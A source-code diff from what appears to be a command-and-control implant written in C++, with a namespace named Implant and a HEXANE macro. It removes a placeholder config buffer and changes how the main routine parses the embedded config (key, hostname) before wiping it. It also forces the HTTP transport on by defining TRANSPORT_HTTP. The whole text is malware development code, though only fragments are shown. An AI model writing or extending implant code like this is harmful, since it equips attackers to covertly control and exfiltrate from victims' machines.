@@ -1,10 +1,6 @@
 #include <core/include/implant.hpp>
 namespace Implant {
 
-    TXT_SECTION(F) BYTE __config[1024] = {
-        0x41,0x41,0x41,0x41, 0x41,0x41,0x41,0x41,
-    };
-
     VOID MainRoutine() {
         HEXANE
 
@@ -45,7 +41,7 @@ namespace Implant {
         Parser::CreateParser(&parser, __config, sizeof(__config));
         x_memset(__config, 0, sizeof(__config));
 
-        Parser::ParserBytecpy(&parser, R_CAST(PBYTE, &Ctx->Root));
+        Parser::ParserBytecpy(&parser, B_PTR(&Ctx->Root));
         Parser::ParserMemcpy(&parser, &Ctx->Config.Key, nullptr);
         Parser::ParserStrcpy(&parser, &Ctx->Config.Hostname, nullptr);
 
@@ -111,6 +107,7 @@ namespace Implant {
 
         Ctx->Transport.OutboundQueue = nullptr;
 
+#define TRANSPORT_HTTP
 #ifdef TRANSPORT_HTTP
         Ctx->Transport.http = S_CAST(_http_context*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_http_context)));
 
